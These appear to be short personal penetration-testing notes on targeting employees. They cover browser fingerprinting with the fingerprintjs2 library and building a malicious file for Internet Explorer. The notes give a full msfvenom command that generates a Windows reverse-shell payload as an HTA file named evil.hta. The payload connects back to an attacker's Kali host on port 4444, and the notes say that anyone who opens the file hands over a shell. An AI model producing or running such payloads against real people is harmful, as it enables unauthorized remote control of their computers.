# to get relevant data on employee

# fingerprinting
use on github fingerprintjs2

will generate you information about installed plugins, browser version, locales, etc. when the client access that page

# generate script to compromise shell via IE
* Generates code for exploit: ``sudo msfvenom -p windows/shell_reverse_tcp LHOST={kali_ip} LPORT=4444 -f hta-psh -o /var/html/evil.hta``
* In case someone open that file => reverse shell is established